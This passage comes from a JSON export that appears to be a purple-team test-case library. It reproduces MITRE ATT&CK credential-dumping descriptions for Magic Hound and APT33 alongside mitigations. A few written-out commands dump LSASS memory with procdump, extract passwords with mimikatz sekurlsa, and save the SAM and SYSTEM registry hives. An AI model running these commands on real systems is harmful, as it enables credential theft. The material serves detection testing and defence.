attacks.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n \nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n#### Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n#### Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n#### DCSync\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n### Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) stole domain credentials from Microsoft Active Directory Domain Controller and leveraged [Mimikatz](https://attack.mitre.org/software/S0002).\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.\n---\nWindows:\nDo not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.\n\nLinux:\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory.\n---\nLimit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.\n---\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication.\n---\nEnsure that local administrator accounts have complex, unique passwords across all systems on the network.\n---\n\nConsider disabling or restricting NTLM.\n---\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.\n---\n[Pupy](https://attack.mitre.org/software/S0192) executes [Mimikatz](https://attack.mitre.org/software/S0002) using PowerShell and can also perform pass-the-ticket and use Lazagne for harvesting credentials.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["3883d65a-3ad2-4111-92fa-19a5d39a119d","5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22","relationship--98d076a5-9640-4337-a5a0-27c0c8a3374b","relationship--a6f27258-cf6a-4d75-a3f0-5de085d528d2","course-of-action--72dade3e-1cba-4182-b3b3-a77ca52f02a1","relationship--a266294c-18a7-4a6e-8291-a901748c929c","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--ef79ec2f-fd7f-4f0b-851c-d215693987be","course-of-action--aeff5887-8f9e-48d5-a523-9b395e2ce80a","relationship--7e8ca453-aee5-48c1-a891-f44a742a95ed","course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a","relationship--fc31837d-530f-45e5-b9f8-bf6268c3ef03","course-of-action--e3388c78-2a8d-47c2-8422-c1398b324462","relationship--7a3426bf-1751-43db-b844-6bf388a4c817","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","relationship--fe849763-78b9-4b8a-9219-2781ac7b00e8","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--ee8ef62a-fcde-44b0-aa63-4028dad703aa","course-of-action--49c06d54-9002-491d-9147-8efb537fbd26","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--7ebe873c-07f5-43a7-a59f-9305f9ec55a5","tool--afc079f3-c0ea-4096-b75d-3f05338b7f60","relationship--b7930db8-2cb9-4ecf-b3d3-7425f99140d8","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018. https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html","Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015. https://github.com/gentilkiwi/mimikatz","Deply, B., Le Toux, V. (2016, June 5). module ~ lsadump. Retrieved August 7, 2017. https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump","Flathers, R. (2018, February 19). creddump7. Retrieved April 11, 2018. https://github.com/Neohapsis/creddump7","Frecn, D.. (2018, October 2). Detecting Attempts to Steal Passwords from Memory. Retrieved October 11, 2019. https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea","Grafnetter, M. (2015, October 26). Retrieving DPAPI Backup Keys from Active Directory. Retrieved December 19, 2017. https://www.dsinternals.com/en/retrieving-dpapi-backup-keys-from-active-directory/","Lich, B. (2016, May 31). Protect derived domain credentials with Credential Guard. Retrieved June 1, 2016. https://technet.microsoft.com/en-us/itpro/windows/keep-secure/credential-guard","Mandiant. (2018). Mandiant M-Trends 2018. Retrieved July 9, 2018. https://www.fireeye.com/content/dam/collateral/en/mtrends-2018.pdf","Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015. https://adsecurity.org/?page_id=1821","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved August 7, 2017. https://adsecurity.org/?p=1729","Metcalf, S. (2015, September 25). Mimikatz DCSync Usage, Exploitation, and Detection. Retrieved December 4, 2017. https://adsecurity.org/?p=1729","Microsoft. (2008, July 25). Credential Security Service Provider and SSO for Terminal Services Logon. Retrieved April 11, 2018. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-vista/cc749211(v=ws.10)","Microsoft. (2012, November 29). Using security policies to restrict NTLM traffic. Retrieved December 4, 2017. https://technet.microsoft.com/library/jj865668.aspx","Microsoft. (2013, July 31). Configuring Additional LSA Protection. Retrieved February 13, 2015. https://technet.microsoft.com/en-us/library/dn408187.aspx","Microsoft. (2017, December 1). MS-DRSR Directory Replication Service (DRS) Remote Protocol. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc228086.aspx","Microsoft. (2017, December 1). MS-NRPC - Netlogon Remote Protocol. Retrieved December 6, 2017. https://msdn.microsoft.com/library/cc237008.aspx","Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018. https://msdn.microsoft.com/library/cc422924.aspx","Microsoft. (n.d.). How to grant the \"Replicating Directory Changes\" permission for the Microsoft Metadirectory Services ADMA service account. Retrieved December 4, 2017. https://support.microsoft.com/help/303972/how-to-grant-the-replicating-directory-changes-permission-for-the-micr","Microsoft. (n.d.). IDL_DRSGetNCChanges (Opnum 3). Retrieved December 4, 2017. https://msdn.microsoft.com/library/dd207691.aspx","Microsoft. (n.d.). MS-SAMR Security Account Manager (SAM) Remote Protocol (Client-to-Server) - Transport. Retrieved December 4, 2017. https://msdn.microsoft.com/library/cc245496.aspx","NSA IAD. (2017, April 20). Secure Host Baseline - Credential Guard. Retrieved April 25, 2017. https://github.com/iadgov/Secure-Host-Baseline/tree/master/Credential%20Guard","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Plett, C., Poggemeyer, L. (12, October 26). Securing Privileged Access Reference Material. Retrieved April 25, 2017. https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","SambaWiki. (n.d.). DRSUAPI. Retrieved December 4, 2017. https://wiki.samba.org/index.php/DRSUAPI","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved August 7, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Schroeder, W. (2015, September 22). Mimikatz and DCSync and ExtraSids, Oh My. Retrieved December 4, 2017. http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/","Security Research and Defense. (2014, May 13). MS14-025: An Update for Group Policy Preferences. Retrieved January 28, 2015. http://blogs.technet.com/b/srd/archive/2014/05/13/ms14-025-an-update-for-group-policy-preferences.aspx","The Australian Cyber Security Centre (ACSC), the Canadian Centre for Cyber Security (CCCS), the New Zealand National Cyber Security Centre (NZ NCSC), CERT New Zealand, the UK National Cyber Security Centre (UK NCSC) and the US National Cybersecurity and Communications Integration Center (NCCIC). (2018, October 11). Joint report on publicly available hacking tools. Retrieved March 11, 2019. https://s3.eu-west-1.amazonaws.com/ncsc-content/files/Joint%20report%20on%20publicly%20available%20hacking%20tools%20%28NCSC%29.pdf","Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017. https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM","Wikipedia. (2018, March 10). Active Directory. Retrieved April 11, 2018. https://en.wikipedia.org/wiki/Active_Directory","Wilson, B. (2016, April 18). The Importance of KB2871997 and KB2928120 for Credential Protection. Retrieved April 11, 2018. https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/","Wine API. (n.d.). samlib.dll. Retrieved December 4, 2017. https://source.winehq.org/WineAPI/samlib.html"],"mitreId":"T1003"},"blueTeam":{"successfulDetectionBehaviors":["Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","### Windows\nMonitor/harden access to LSASS and SAM table with tools that allow process whitelisting. Limit credential overlap across systems to prevent lateral movement opportunities using [Valid Accounts](https://attack.mitre.org/techniques/T1078) if passwords and hashes are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. (Citation: Microsoft Securing Privileged Access)\n\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA. (Citation: Microsoft LSA)\n\nIdentify and block potentially malicious software that may be used to dump credentials by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)\n\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. (Citation: TechNet Credential Guard) It also does not protect against all forms of credential dumping. (Citation: GitHub SHB Credential Guard)\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication. (Citation: AdSecurity DCSync Sept 2015) (Citation: Microsoft Replication ACL)\n\nConsider disabling or restricting NTLM traffic. (Citation: Microsoft Disable NTLM Nov 2012)\n\n### Linux\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to escalated privileges to avoid hostile programs from accessing such sensitive regions of memory.","Train users to to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.","Configure Active Directory to prevent use of certain techniques; use SID Filtering, etc.","Set and enforce secure password policies for accounts.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--5d854213-edf5-482f-8553-0918fe48b055","vectrId":"5d854213-edf5-482f-8553-0918fe48b055","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"5d854213-edf5-482f-8553-0918fe48b055","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credential Dumping","variant":"APT33 - Credential Dumping - PowerSploit - Pupy - LaZagne - PoshC2 - Mimikatz - Empire","objective":"Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.\n\nSeveral of the tools mentioned in this technique may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.\n\n### Windows\n\n#### SAM (Security Accounts Manager)\n\nThe SAM is a database file that contains local accounts for the host, typically those found with the ‘net user’ command. To enumerate the SAM database, system level access is required.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with [Reg](https://attack.mitre.org/software/S0075):\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes. (Citation: GitHub Creddump7)\n\nNotes:\nRid 500 account is the local, in-built administrator.\nRid 501 is the guest account.\nUser accounts start with a RID of 1,000+.\n\n#### Cached Credentials\n\nThe DCC2 (Domain Cached Credentials version 2) hash, used by Windows Vista and newer caches credentials when the domain controller is unavailable. The number of default cached credentials varies, and this number can be altered per system. This hash does not allow pass-the-hash style attacks.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nCached credentials for Windows Vista are derived using PBKDF2.\n\n#### Local Security Authority (LSA) Secrets\n\nWith SYSTEM access to a host, the LSA secrets often allows trivial access from a local account to domain-based account credentials. The Registry is used to store the LSA secrets.\n \nWhen services are run under the context of local or domain users, their passwords are stored in the Registry. If auto-logon is enabled, this information will be stored in the Registry as well.\n \nA number of tools can be used to retrieve the SAM file through in-memory techniques.\n\n* pwdumpx.exe \n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, reg.exe can be used to extract from the Registry and Creddump7 used to gather the credentials.\n\nNotes:\nThe passwords extracted by his mechanism are UTF-16 encoded, which means that they are returned in plaintext.\nWindows 10 adds protections for LSA Secrets described in Mitigation.\n\n#### NTDS from Domain Controller\n\nActive Directory stores information about members of the domain including devices and users to verify credentials and define access rights. The Active Directory domain database is stored in the NTDS.dit file. By default the NTDS file will be located in %SystemRoot%\\NTDS\\Ntds.dit of a domain controller. (Citation: Wikipedia Active Directory)\n \nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy\n\n#### Group Policy Preference (GPP) Files\n\nGroup Policy Preferences (GPP) are tools that allowed administrators to create domain policies with embedded credentials. These policies, amongst other things, allow administrators to set local accounts.\n\nThese group policies are stored in SYSVOL on a domain controller, this means that any domain user can view the SYSVOL share and decrypt the password (the AES private key was leaked on-line. (Citation: Microsoft GPP Key) (Citation: SRD GPP)\n\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\n\n* Metasploit’s post exploitation module: \"post/windows/gather/credentials/gpp\"\n* Get-GPPPassword (Citation: Obscuresecurity Get-GPPPassword)\n* gpprefdecrypt.py\n\nNotes:\nOn the SYSVOL share, the following can be used to enumerate potential XML files.\ndir /s * .xml\n\n#### Service Principal Names (SPNs)\n\nSee [Kerberoasting](https://attack.mitre.org/techniques/T1208).\n\n#### Plaintext Credentials\n\nAfter a user logs on to a system, a variety of credentials are generated and stored in the Local Security Authority Subsystem Service (LSASS) process in memory. These credentials can be harvested by a administrative user or SYSTEM.\n\nSSPI (Security Support Provider Interface) functions as a common interface to several Security Support Providers (SSPs): A Security Support Provider is a dynamic-link library (DLL) that makes one or more security packages available to applications.\n\nThe following SSPs can be used to access credentials:\n\nMsv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\nWdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges. (Citation: TechNet Blogs Credential Protection)\nKerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\nCredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services. (Citation: Microsoft CredSSP)\n \nThe following tools can be used to enumerate credentials:\n\n* [Windows Credential Editor](https://attack.mitre.org/software/S0005)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\n#### DCSync\n\nDCSync is a variation on credential dumping which can be used to acquire sensitive information from a domain controller. Rather than executing recognizable malicious code, the action works by abusing the domain controller's  application programming interface (API) (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller. Any members of the Administrators, Domain Admins, Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data (Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a Golden Ticket for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1097) (Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098). (Citation: InsiderThreat ChangeNTLM July 2017) DCSync functionality has been included in the \"lsadump\" module in Mimikatz. (Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol. (Citation: Microsoft NRPC Dec 2017)\n\n### Linux\n\n#### Proc filesystem\n\nThe /proc filesystem on Linux contains a great deal of information regarding the state of the running operating system. Processes running with root privileges can use this facility to scrape live memory of other running programs. If any of these programs store passwords in clear text or password hashes in memory, these values can then be harvested for either usage or brute force attacks, respectively. This functionality has been implemented in the [MimiPenguin](https://attack.mitre.org/software/S0179), an open source tool inspired by [Mimikatz](https://attack.mitre.org/software/S0002). The tool dumps process memory, then harvests passwords and hashes by looking for text strings and regex patterns for how given applications such as Gnome Keyring, sshd, and Apache use memory to store such authentication artifacts.\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) is an open source, offensive security framework comprised of [PowerShell](https://attack.mitre.org/techniques/T1086) modules and scripts that perform a wide range of tasks related to penetration testing such as code execution, persistence, bypassing anti-virus, recon, and exfiltration. (Citation: GitHub PowerSploit May 2012) (Citation: PowerShellMagazine PowerSploit July 2014) (Citation: PowerSploit Documentation)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)\n---\n[LaZagne](https://attack.mitre.org/software/S0349) is a post-exploitation, open-source tool used to recover stored passwords on a system. It has modules for Windows, Linux, and OSX, but is mainly focused on Windows systems. [LaZagne](https://attack.mitre.org/software/S0349) is publicly available on GitHub.(Citation: GitHub LaZagne Dec 2018)\n---\n[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration and post-exploitation framework that is publicly available on GitHub. The server-side components of the tool are primarily written in Python, while the implants are written in [PowerShell](https://attack.mitre.org/techniques/T1086). Although [PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub PoshC2)\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)\n---\n[Empire](https://attack.mitre.org/software/S0363) is an open source, cross-platform remote administration and post-exploitation framework that is publicly available on GitHub. While the tool itself is primarily written in Python, the post-exploitation agents are written in pure [PowerShell](https://attack.mitre.org/techniques/T1086) for Windows and Python for Linux/macOS. [Empire](https://attack.mitre.org/software/S0363) was one of five tools singled out by a joint report on public hacking tools being widely used by adversaries.(Citation: NCSC Joint Report Public Tools)(Citation: Github PowerShell Empire)(Citation: GitHub ATTACK Empire)\n\n","command":"[APT33](https://attack.mitre.org/groups/G0064) has used a variety of publicly available tools like [LaZagne](https://attack.mitre.org/software/S0349), [Mimikatz](https://attack.mitre.org/software/S0002), Gpppassword, SniffPass, and ProcDump to dump credentials.\nOn Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.\n---\nWindows:\nDo not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.\n\nLinux:\nScraping the passwords from memory requires root privileges. Follow best practices in restricting access to privileged accounts to avoid hostile programs from accessing such sensitive regions of memory.\n---\nLimit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.\n---\n\nManage the access control list for “Replicating Directory Changes” and other permissions associated with domain controller replication.\n---\nEnsure that local administrator accounts have complex, unique passwords across all systems on the network.\n---\n\nConsider disabling or restricting NTLM.\n---\nWith Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.\n---\n[PowerSploit](https://attack.mitre.org/software/S0194) contains a collection of Exfiltration modules that can harvest credentials from Group Policy Preferences, Windows vault credential objects, or using [Mimikatz](https://attack.mitre.org/software/S0002).\n---\n[Pupy](https://attack.mitre.org/software/S0192) executes [Mimikatz](https://attack.mitre.org/software/S0002) using PowerShell and can also perform pass-the-ticket and use Lazagne for harvesting credentials.\n---\n[LaZagne](https://attack.mitre.org/software/S0349) can perform credential dumping to obtain account and password information.\n---\n[PoshC2](https://attack.mitre.org/software/S0378) contains an implementation of [Mimikatz](https://attack.mitre.org/software/S0002) to gather credentials from memory.\n---\n[Mimikatz](https://attack.mitre.org/software/S0002) performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSA, SAM table, credential vault, DCSync/NetSync, and DPAPI.\n---\n[Empire](https://attack.mitre.org/software/S0363) contains an implementation of [Mimikatz](https://attack.mitre.org/software/S0002) to gather credentials from 